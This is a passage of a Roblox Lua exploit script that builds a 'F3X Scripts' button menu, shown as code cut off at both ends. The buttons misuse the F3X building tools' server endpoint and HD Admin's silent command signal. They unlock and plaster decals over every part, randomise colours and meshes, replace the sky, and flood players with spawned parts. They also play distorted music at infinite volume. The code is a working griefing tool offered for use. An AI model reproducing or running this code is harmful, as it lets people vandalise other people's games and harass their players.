				task.wait(0)
	
				for _, player in ipairs(game.Players:GetPlayers()) do
					local char = player.Character
					local hum  = char and char:FindFirstChildOfClass("Humanoid")
					local hrp  = char and char:FindFirstChild("Torso")
					if not (hum and hum.Health > 0 and hrp) then
						continue 
					end
	
					local spawnCF = hrp.CFrame * CFrame.new(math.random(),-1.5,math.random())
	
					local part = remote:InvokeServer("CreatePart", "Normal", spawnCF, workspace)
					part.CanCollide = false
	
					spawn(function()
						SetName(part, "Particlassss")
						Resize(part, Vector3.new(3, 3, 0.2), part.CFrame)
						SetCollision(part, true)
						SetTrans(part, 1)
						SetAnchor(true, part)
						SpawnDecal(part, Enum.NormalId.Front)
						AddDecal(part, "127984827768386", Enum.NormalId.Front)
						SpawnDecal(part, Enum.NormalId.Back)
						AddDecal(part, "127984827768386", Enum.NormalId.Back)
					end)
	
					local randomDir = Vector3.new(
						math.random(-30, 30),
						math.random(-30, 30),
						math.random(-30, 30)
					)
					local startPos = part.CFrame.Position
	
					spawn(function()
						for i = 1, 90 do
							if not part.Parent then break end
	
							local progress = i / 90
							local newPos = startPos + (randomDir * progress)
	
							local newCF = CFrame.new(newPos)
							MovePart(part, newCF)
	
							task.wait() 
						end
						delete(part)
					end)
				end
			end
		end
	
	
	
	
	
		coroutine.wrap(particle)()
	
	end)
end;
task.spawn(C_41);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_42()
local script = G2L["42"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer("/music 133180219581309 /pitch 0.14 /volume inf")
	end)
end;
task.spawn(C_42);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_44()
local script = G2L["44"];
	script.Parent.MouseButton1Click:Connect(function()
		local Players = game:GetService("Players")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RunService = game:GetService("RunService")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
	
	
		local tool
	
		local function findSyncAPITool()
			for _, v in pairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then
					return v.Parent
				end
			end
			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then
					return v.Parent
				end
			end
		end
	
		tool = findSyncAPITool()
		if not tool then
			warn("SyncAPI tool not found!")
			return
		end
	
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function invoke(args)
			remote:InvokeServer(unpack(args))
		end
	
	
		local function SetCollision(part, boolean)
			invoke({ "SyncCollision", { { Part = part, CanCollide = boolean } } })
		end
	
		local function SetAnchor(part, boolean)
			invoke({ "SyncAnchor", { { Part = part, Anchored = boolean } } })
		end
	
		local function CreatePart(cf, parent)
			invoke({ "CreatePart", "Normal", cf, parent })
		end
	
		local function DestroyPart(part)
			invoke({ "Remove", { part } })
		end
	
		local function MovePart(part, cf)
			invoke({ "SyncMove", { { Part = part, CFrame = cf } } })
		end
	
		local function Resize(part, size, cf)
			invoke({ "SyncResize", { { Part = part, Size = size, CFrame = cf } } })
		end
	
		local function AddMesh(part)
			invoke({ "CreateMeshes", { { Part = part } } })
		end
	
		local function SetMesh(part, meshId)
			invoke({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshId } } })
		end
	
		local function SetTexture(part, texId)
			invoke({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texId } } })
		end
	
		local function SetName(part, name)
			invoke({ "SetName", { part }, name })
		end
	
		local function MeshResize(part, size)
			invoke({ "SyncMesh", { { Part = part, Scale = size } } })
		end
	
		local function Weld(part1, part2, lead)
			invoke({ "CreateWelds", { part1, part2 }, lead })
		end
	
		local function SetLocked(part, boolean)
			invoke({ "SetLocked", { part }, boolean })
		end
	
		local function SetTransparency(part, transparency)
			invoke({ "SyncMaterial", { { Part = part, Transparency = transparency } } })
		end
	
	
		local function CreateSpotlight(part)
			invoke({ "CreateLights", { { Part = part, LightType = "SpotLight" } } })
		end
	
		local function SyncLighting(part, brightness)
			invoke({ "SyncLighting", { { Part = part, LightType = "SpotLight", Brightness = brightness } } })
		end
	
		local function SetColor(part, color)
			invoke({ "SyncColor", { { Part = part, Color = color, UnionColoring = false } } })
		end
	
	
		local function SpawnDecal(part, face)
			invoke({ "CreateTextures", { { Part = part, Face = face, TextureType = "Decal" } } })
		end
	
		local function AddDecal(part, assetId, face)
			invoke({ "SyncTexture", { { Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://" .. assetId } } })
		end
	
	
		local function SpamDecal(assetId)
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v, false)
						for _, face in pairs(Enum.NormalId:GetEnumItems()) do
							SpawnDecal(v, face)
							AddDecal(v, assetId, face)
						end
					end)
				end
			end
		end
	
		SpamDecal("127113096618457")
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
		function reflect(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Reflectance"] = int
					}
				}
			}
			_(args)
		end
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function MeshColor(part,color)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["VertexColor"] = color
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
	
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function Setmate(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Material"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
	
			local function findBuildingTools()
				local player = game:GetService("Players").LocalPlayer
	
				for _, item in ipairs(player.Character:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				for _, item in ipairs(player.Backpack:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				return nil
			end
			local buildingTools = findBuildingTools()
			if not buildingTools then
				warn("btools not found")
				return
			end
	
			local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
			local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
	
			if not serverEndpoint then
				warn("btools not found")
				return
			end
	
			local skyInstance = workspace.Terrain:FindFirstChild("Sky") or workspace:FindFirstChild("Sky")
			if not skyInstance then
	
				print"ok"
			end
			spawn(function()
				DestroyPart(skyInstance)
			end)
			local success, result
			if serverEndpoint:IsA("RemoteFunction") then
				success, result = pcall(function()
					return serverEndpoint:InvokeServer(unpack(args))
				end)
			else
	
				serverEndpoint:FireServer(unpack(args))
				success = true
			end
	
			if success then
	
				print"yay"
	
			end
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			mhm = CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,-5,0)
			v = remote:InvokeServer("CreatePart","Normal",mhm,workspace.Terrain)
			spawn(function()
				rq:InvokeServer(";unfog ;fogcolor black ;time 6")
			end)
			spawn(function()
				SetName(v,"Skybox")
			end)
			spawn(function()
				AddMesh(v)
			end)
			spawn(function()
				SetMesh(v,"111891702759441")
			end)
			spawn(function()
				MeshColor(v,vector.create(4.5,4.5,4.5))
			end)
			spawn(function()
				SetTexture(v,id)
			end)
			spawn(function()
				MeshResize(v,Vector3.new(100000,100000,100000))
			end)
			spawn(function()
				SetLocked(v,true)
			end)
		end
		Sky("172423468")
	
	
	
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function MovePart(part, cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		local function delete(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			remote:InvokeServer(unpack(args))
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function SetTrans(part, int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SpawnDecal(part, side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
			_(args)
		end
	
		function AddDecal(part, asset, side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		local function particle()
			while true do
				task.wait(0)
	
				for _, player in ipairs(game.Players:GetPlayers()) do
					local char = player.Character
					local hum  = char and char:FindFirstChildOfClass("Humanoid")
					local hrp  = char and char:FindFirstChild("Torso")
					if not (hum and hum.Health > 0 and hrp) then
						continue 
					end
	
					local spawnCF = hrp.CFrame * CFrame.new(math.random(),-1.5,math.random())
	
					local part = remote:InvokeServer("CreatePart", "Normal", spawnCF, workspace)
					part.CanCollide = false
	
					spawn(function()
						SetName(part, "Particlassss")
						Resize(part, Vector3.new(3, 3, 0.2), part.CFrame)
						SetCollision(part, true)
						SetTrans(part, 1)
						SetAnchor(true, part)
						SpawnDecal(part, Enum.NormalId.Front)
						AddDecal(part, "127113096618457", Enum.NormalId.Front)
						SpawnDecal(part, Enum.NormalId.Back)
						AddDecal(part, "127113096618457", Enum.NormalId.Back)
					end)
	
					local randomDir = Vector3.new(
						math.random(-30, 30),
						math.random(-30, 30),
						math.random(-30, 30)
					)
					local startPos = part.CFrame.Position
	
					spawn(function()
						for i = 1, 90 do
							if not part.Parent then break end
	
							local progress = i / 90
							local newPos = startPos + (randomDir * progress)
	
							local newCF = CFrame.new(newPos)
							MovePart(part, newCF)
	
							task.wait() 
						end
						delete(part)
					end)
				end
			end
		end
	
	
	
	
	
		coroutine.wrap(particle)()
	end)
end;
task.spawn(C_44);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_45()
local script = G2L["45"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer("/music 105336676258720 /pitch 0.17 /volume inf")
	end)
	
end;
task.spawn(C_45);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_47()
local script = G2L["47"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";r6") -- U can change all of it with your commands!
	
	
	end)
end;
task.spawn(C_47);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_49()
local script = G2L["49"];
	script.Parent.MouseButton1Click:Connect(function()
		--rgrg
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						Color(v,Color3.new(math.random(0,255),math.random(0,255),math.random(0,255)))
					end)
				end
			end
		end
		randomise()
	
	end)
end;
task.spawn(C_49);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_4b()
local script = G2L["4b"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local backpack = player.Backpack
	
		local function getf3x()
			for _, v in ipairs(backpack:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
			for _, v in ipairs(char:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			return nil
		end
	
		-- get all info
	
		local f3x = getf3x()
		if not f3x then
			warn("you dont have f3x skid")
		end
		local syncapi = f3x.SyncAPI
		local serverendpoint = syncapi.ServerEndpoint
	
		local meshTypes = {
			Enum.MeshType.Brick,
			Enum.MeshType.Cylinder,
			Enum.MeshType.FileMesh,
			Enum.MeshType.Head,
			Enum.MeshType.Sphere,
			Enum.MeshType.Wedge
		}
	
		local function makemesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function syncmeshtype(part, type1)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["MeshType"] = type1,
						["Part"] = part
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local randomMeshType = meshTypes[math.random(1, #meshTypes)]
	
		local function applymesh()
			for _, v in ipairs(workspace:GetDescendants()) do
				spawn(function()
					makemesh(v)
					syncmeshtype(v, randomMeshType)
				end)
			end
		end
	
		applymesh()
	
	
	end)
end;
task.spawn(C_4b);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_4d()
local script = G2L["4d"];
	script.Parent.MouseButton1Click:Connect(function()
		local TweenService = game:GetService("TweenService")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
	
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
	
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local root = character:WaitForChild("HumanoidRootPart")
	
	
		local outerPart = Instance.new("Part")
		outerPart.Size = Vector3.new(3, 3, 3)
		outerPart.Anchored = true
		outerPart.CanCollide = false
		outerPart.Name = "BlueRatThingFa8"
		outerPart.Transparency = 0.5
		outerPart.Color = Color3.fromRGB(0, 170, 255)
		outerPart.Parent = workspace
	
	
		local r = Instance.new("ClickDetector")
		r.Parent = outerPart
	
		r.MouseClick:Connect(function(player)
			outerPart:Destroy()
		end)
		local positiont = outerPart.Position
	
		plr = game.Players.LocalPlayer.Name
		y = Instance.new("BillboardGui")
		y.Size = UDim2.new(0,100,0,150)
		y.StudsOffset = Vector3.new(0,1,0)
		y.Parent = outerPart
		y.Adornee = outerPart
		f = Instance.new("TextLabel")
		f.Parent = y
		f.BackgroundTransparency = 1
		f.Position = UDim2.new(0,0,0,-50)
		f.Size = UDim2.new(0,100,0,100)
		f.Font = Enum.Font.Arial
		f.TextSize = 20
		f.TextYAlignment = Enum.TextYAlignment.Bottom
		f.Text = "HttpEnabled is FALSE! Some of the commands may not work!"
		f.TextStrokeColor3 = Color3.new(0,0,0)
		f.TextColor3 = Color3.fromRGB(22, 96, 148)
		f.TextStrokeTransparency = 0
	
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshId = "rbxassetid://3110114862"
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
		mesh.Parent = outerPart
	
	
		local innerPart = Instance.new("Part")
		innerPart.Size = Vector3.new(1, 1, 1)
		innerPart.Anchored = true
		innerPart.CanCollide = false
		innerPart.Transparency = 0
		innerPart.Color = Color3.new(1, 1, 1)
		innerPart.Material = Enum.Material.Neon
		innerPart.Parent = outerPart
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshId = "rbxassetid://12800536037"
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.Scale = Vector3.new(1, 1, 1)
		mesh.Parent = innerPart
	
	
		local outerPart1 = Instance.new("Part")
		outerPart1.Size = Vector3.new(3, 3, 3)
		outerPart1.Anchored = true
		outerPart1.CanCollide = false
		outerPart1.Name = "BlueRatThingFa9"
		outerPart1.Transparency = 0.5
		outerPart1.Color = Color3.fromRGB(0, 170, 255)
		outerPart1.Parent = workspace
		local r = Instance.new("ClickDetector")
		r.Parent = outerPart1
	
		r.MouseClick:Connect(function(player)
			outerPart1:Destroy()
		end)
	
		local positiontt = outerPart1.Position
	
		plr = game.Players.LocalPlayer.Name
		y = Instance.new("BillboardGui")
		y.Size = UDim2.new(0,100,0,150)
		y.StudsOffset = Vector3.new(0,1,0)
		y.Parent = outerPart1
		y.Adornee = outerPart1
		f = Instance.new("TextLabel")
		f.Parent = y
		f.BackgroundTransparency = 1
		f.Position = UDim2.new(0,0,0,-50)
		f.Size = UDim2.new(0,100,0,100)
		f.Font = Enum.Font.Arial
		f.TextSize = 20
		f.TextYAlignment = Enum.TextYAlignment.Bottom
		f.Text = "You an admin! Level: 4"
		f.TextStrokeColor3 = Color3.new(0,0,0)
		f.TextColor3 = Color3.fromRGB(22, 96, 148)
		f.TextStrokeTransparency = 0
	
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshId = "rbxassetid://3110114862"
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
		mesh.Parent = outerPart1
	
	
		local innerPart1 = Instance.new("Part")
		innerPart1.Size = Vector3.new(1, 1, 1)
		innerPart1.Anchored = true
		innerPart1.CanCollide = false
		innerPart1.Transparency = 0
		innerPart1.Color = Color3.new(1, 1, 1)
		innerPart1.Material = Enum.Material.Neon
		innerPart1.Parent = outerPart1
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshId = "rbxassetid://12800536037"
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.Scale = Vector3.new(1, 1, 1)
		mesh.Parent = innerPart1
	
	
		local angle = 0
		RunService.RenderStepped:Connect(function(deltaTime)
			if not root or not root.Parent then return end
			angle += deltaTime * math.pi * 0.3
	
			local radius = 5
			local offsetX = math.cos(angle) * radius
			local offsetZ = math.sin(angle) * radius
			local height = 2
	
			local position = root.Position + Vector3.new(offsetX, height, offsetZ)
			outerPart1.Position = position
			innerPart1.Position = position
			outerPart1.Orientation = Vector3.new(math.deg(angle * 0.5), math.deg(angle * 0.5), math.deg(angle * 0.5)) 
	
			innerPart1.Orientation = Vector3.new(math.deg(angle * 0.3), math.deg(angle * 0.3), math.deg(angle * 0.3)) 
	
	
		end)
	
	
		local angle = 10
		RunService.RenderStepped:Connect(function(deltaTime)
			if not root or not root.Parent then return end
			angle += deltaTime * math.pi * 0.3
	
			local radius = 5
			local offsetX = math.cos(angle) * radius
			local offsetZ = math.sin(angle) * radius
			local height = 2
	
			local position = root.Position + Vector3.new(offsetX, height, offsetZ)
			outerPart.Position = position
			innerPart.Position = position
			outerPart.Orientation = Vector3.new(math.deg(angle * 0.5), math.deg(angle * 0.5), math.deg(angle * 0.5)) 
	
			innerPart.Orientation = Vector3.new(math.deg(angle * 0.3), math.deg(angle * 0.3), math.deg(angle * 0.3)) 
	
	
	
		end)
	
		local gui = Instance.new("ScreenGui")
		gui.Name = "mr Bean admin update"
		gui.Parent = game.CoreGui
	
		local Frame_160579 = Instance.new("Frame")
		Frame_160579.Name = "Frame"
		Frame_160579.Parent = gui
		Frame_160579.BackgroundColor3 = Color3.new(0, 0, 0)
		Frame_160579.Position = UDim2.new(0.20000000298023224, 63, 0.20000000298023224, -29)
		Frame_160579.Size = UDim2.new(0, 500, 0, 300)
		Frame_160579.Visible = true
		Frame_160579.BackgroundTransparency = 0.5
	
	
	
		local ScrollingFrame_154627 = Instance.new("ScrollingFrame")
		ScrollingFrame_154627.Name = "ScrollingFrame"
		ScrollingFrame_154627.Parent = Frame_160579
		ScrollingFrame_154627.BackgroundColor3 = Color3.new(0.1568627506494522, 0.1568627506494522, 0.1568627506494522)
		ScrollingFrame_154627.Position = UDim2.new(0, 0, 0.14000000059604645, -4)
		ScrollingFrame_154627.Size = UDim2.new(0.9300000071525574, 37, 0.7699999809265137, 35)
		ScrollingFrame_154627.BorderSizePixel = 0
		ScrollingFrame_154627.BackgroundTransparency = 0.5
		ScrollingFrame_154627.Visible = true
	
	
		local TextLabel_288272 = Instance.new("TextLabel")
		TextLabel_288272.Name = "TextLabel"
		TextLabel_288272.Parent = ScrollingFrame_154627
		TextLabel_288272.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_288272.Position = UDim2.new(0, 0, 0, 30)
		TextLabel_288272.Size = UDim2.new(0.8999999761581421, 0, 0, 19)
		TextLabel_288272.Visible = true
		TextLabel_288272.Text = "AK47 [PLAYER] - gives you ak47 [MOD]"
		TextLabel_288272.TextScaled = true
		TextLabel_288272.BackgroundTransparency = 1
		TextLabel_288272.BorderSizePixel = 0
		TextLabel_288272.Font = Enum.Font.SourceSansSemibold
		TextLabel_288272.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_288272.TextSize = 16
		local TextLabel_263877 = Instance.new("TextLabel")
		TextLabel_263877.Name = "TextLabel"
